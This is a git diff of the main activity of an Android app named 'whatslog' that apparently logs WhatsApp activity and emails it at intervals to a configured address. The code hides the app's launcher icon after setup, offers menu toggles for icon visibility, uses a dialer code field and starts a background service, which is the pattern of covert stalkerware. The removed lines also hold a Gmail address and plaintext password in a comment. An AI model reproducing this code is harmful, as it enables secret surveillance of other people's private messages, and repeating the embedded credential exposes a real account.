@@ -1,10 +1,9 @@
-package com.android.whatslog;
+package com.android.whatslog.activities;
 
 import java.sql.SQLException;
 import java.util.List;
 
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -12,6 +11,9 @@ import android.view.View;
 import android.widget.EditText;
 import android.widget.Toast;
 
+import com.android.whatslog.MyService;
+import com.android.whatslog.R;
+import com.android.whatslog.Utils;
 import com.android.whatslog.dao.DatabaseHelperConfiguracao;
 import com.android.whatslog.dao.DatabaseHelperInternal;
 import com.android.whatslog.model.Configuracao;
@@ -19,10 +21,8 @@ import com.j256.ormlite.android.apptools.OrmLiteBaseActivity;
 
 public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {
 
-	private EditText smtp;
 	private EditText intervalo;
 	private EditText to;
-	private EditText password;
 	private EditText dialer;
 	private EditText subject;
 
@@ -32,15 +32,14 @@ public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {
 
 		if (isFirstTime()) {
 			setContentView(R.layout.conf);
-			smtp = (EditText) findViewById(R.configuracao.smtp);
 			intervalo = (EditText) findViewById(R.configuracao.intervalo);
 			to = (EditText) findViewById(R.configuracao.to);
-			password = (EditText) findViewById(R.configuracao.password);
 			dialer = (EditText) findViewById(R.configuracao.dialer);
 			subject = (EditText) findViewById(R.configuracao.subject);
 
 		} else {
 			setContentView(R.layout.main);
+			Utils.showIcon(false, this);
 		}
 	}
 
@@ -51,6 +50,12 @@ public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {
 			Intent intent = new Intent(this, ConfActivity.class);
 			setIntent(intent);
 			startActivity(intent);
+			return true;
+		case R.id.show_icon:
+			Utils.showIcon(true, this);
+			return true;
+		case R.id.hide_icon:
+			Utils.showIcon(false, this);
 			return true;
 		default:
 			return super.onMenuItemSelected(featureId, item);
@@ -80,23 +85,9 @@ public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {
 		} catch (SQLException e) {
 			return false;
 		}
-
 	}
 
 	public void showLog(View view) {
-
-		// GMailSender sender = new
-		// GMailSender("bruno.teixeira.canto@gmail.com", "apolinario");
-		// try {
-		// sender.sendMail("This is Subject",
-		// "This is Body",
-		// "bruno.teixeira.canto@gmail.com",
-		// "bruno.teixeira.canto@gmail.com");
-		// } catch (Exception e) {
-		// // TODO Auto-generated catch block
-		// e.printStackTrace();
-		// }
-
 		Intent intent = new Intent(this, LogActivity.class);
 		setIntent(intent);
 		startActivityForResult(intent, 1);
@@ -133,8 +124,6 @@ public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {
 				}
 
 				conf.setEmailTo(to.getText().toString());
-				conf.setPassword(password.getText().toString());
-				conf.setSmtpMail(smtp.getText().toString());
 				conf.setFirstTime(false);
 				conf.setIntervalo(Integer.parseInt(intervalo.getText()
 						.toString()));
@@ -144,8 +133,7 @@ public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {
 				database.getDao().createOrUpdate(conf);
 
 				//hide icon
-				PackageManager p = getPackageManager();
-				p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+				Utils.showIcon(false, this);
 
 				startService(new Intent(this, MyService.class));
 
@@ -160,9 +148,7 @@ public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {
 
 	private boolean validate() {
 		if (to.getText().toString().length()==0
-				|| password.getText().toString().length()==0
 				|| subject.getText().toString().length()==0
-				|| smtp.getText().toString().length()==0
 				|| intervalo.getText().toString().length()==0
 				|| dialer.getText().toString().length()==0) {
 			Toast.makeText(this, "All fields is required!", Toast.LENGTH_LONG).show();
